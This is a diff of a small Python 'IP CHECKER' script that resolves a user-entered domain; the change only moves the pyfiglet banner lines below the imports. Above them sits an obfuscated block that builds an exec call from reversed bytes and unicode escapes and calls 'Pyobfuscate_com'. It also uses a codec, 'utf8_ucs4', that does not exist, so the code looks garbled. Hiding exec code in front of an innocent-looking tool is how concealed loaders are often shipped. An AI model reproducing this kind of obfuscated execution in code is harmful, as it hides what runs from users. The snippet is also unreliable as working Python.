@@ -8,12 +8,12 @@ b=lambda**args:type("exec",(),args)();_byte=b(a=chr(0)).a;exec('''for self in ra
 for _,i in numpy(_float(_int(_str(''.join([_byte[len(_byte)-range] for range in range(1,len(_byte)+0o1)])))).decode('utf8_ucs4'),lambda s: next('u0063\u006F\u0075\u006E\u0074\u0028\u0029') if s.startswith('\x3e') else -1):_winkle = ''.join(s.rstrip('\n') for s in i)
 Pyobfuscate_com(_bytes=False==True,_sparkle= _winkle)
 
-ascii_banner = pyfiglet.figlet_format("IP CHECKER")
-print(ascii_banner)
-
 import socket
 import json
 import pprint
+import pyfiglet
+ascii_banner = pyfiglet.figlet_format("IP CHECKER")
+print(ascii_banner)
 
 hostname = input("[+]MASUKAN DOMAIN: ")
 
